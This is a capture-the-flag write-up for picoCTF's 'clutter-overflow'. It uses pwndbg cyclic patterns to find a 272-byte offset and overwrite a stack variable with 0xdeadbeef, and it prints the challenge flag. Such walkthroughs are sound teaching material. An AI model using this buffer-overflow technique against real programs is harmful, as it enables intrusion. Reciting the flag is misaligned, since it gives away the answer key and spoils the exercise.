# clutter-overflow
Description

Clutter, clutter everywhere and not a byte to use.

nc mars.picoctf.net 31890

---

<img width="745" alt="Screenshot 2024-04-09 at 1 48 16 AM" src="https://github.com/Lynk4/PicoCTF/assets/44930131/04bd08ba-5111-4d6f-897e-a7e9b646e58d">

---

after running the prgram we need to set ***code == 0xdeadbeef***

So first lets find the offset of the binary file I'm gonna use gdb

```
pwndbg> cyclic 300
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
pwndbg> run
Starting program: /home/lynk/picoCTF/clutter-overflow/chall 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
code == 0x6261616161616169
code != 0xdeadbeef :(

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007c0 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────
 RAX  0x0
*RBX  0x7fffffffe458 —▸ 0x7fffffffe6be ◂— '/home/lynk/picoCTF/clutter-overflow/chall'
 RCX  0x0
 RDX  0x0
*RDI  0x7fffffffe050 —▸ 0x7fffffffe080 ◂— 'code != 0xdeadbeef :(\n6169\n'
*RSI  0x7fffffffe080 ◂— 'code != 0xdeadbeef :(\n6169\n'
*R8   0x78
 R9   0x0
 R10  0x0
*R11  0x202
 R12  0x0
*R13  0x7fffffffe468 —▸ 0x7fffffffe6e8 ◂— 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
 R14  0x0
*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*RBP  0x626161616161616a ('jaaaaaab')
*RSP  0x7fffffffe348 ◂— 'kaaaaaablaaaaaabmaaa'
*RIP  0x4007c0 (main+249) ◂— ret 
─────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────
 ► 0x4007c0 <main+249>    ret    <0x626161616161616b>










───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe348 ◂— 'kaaaaaablaaaaaabmaaa'
01:0008│     0x7fffffffe350 ◂— 'laaaaaabmaaa'
02:0010│     0x7fffffffe358 ◂— 0x6161616d /* 'maaa' */
03:0018│     0x7fffffffe360 ◂— 0x100400040 /* '@' */
04:0020│     0x7fffffffe368 —▸ 0x7fffffffe458 —▸ 0x7fffffffe6be ◂— '/home/lynk/picoCTF/clutter-overflow/chall'
05:0028│     0x7fffffffe370 —▸ 0x7fffffffe458 —▸ 0x7fffffffe6be ◂— '/home/lynk/picoCTF/clutter-overflow/chall'
06:0030│     0x7fffffffe378 ◂— 0x6355cb100be6a356
07:0038│     0x7fffffffe380 ◂— 0x0
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► 0         0x4007c0 main+249
   1 0x626161616161616b
   2 0x626161616161616c
   3       0x6161616d
   4      0x100400040
   5   0x7fffffffe458
   6   0x7fffffffe458
   7 0x6355cb100be6a356
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l jaaaaaab
Finding cyclic pattern of 8 bytes: b'jaaaaaab' (hex: 0x6a61616161616162)
Found at offset 272
pwndbg>
```
so the offset is 272.

We require 272 bytes to operate. Thus, we require 264 (272 - 8) to reach the value we wish to change. To pass the check and read the flag, we must write 0xdeadbeef in little-endian format after the 264 characters.

let's go for it...........

---

<img width="1440" alt="Screenshot 2024-04-09 at 1 51 48 AM" src="https://github.com/Lynk4/PicoCTF/assets/44930131/28565cbd-7586-4882-8af9-8b42cbd819a1">


---


<img width="1440" alt="Screenshot 2024-04-09 at 1 51 54 AM" src="https://github.com/Lynk4/PicoCTF/assets/44930131/f9242204-4a03-4b7f-8498-fe524b340bed">


---

flag:```picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}```

---
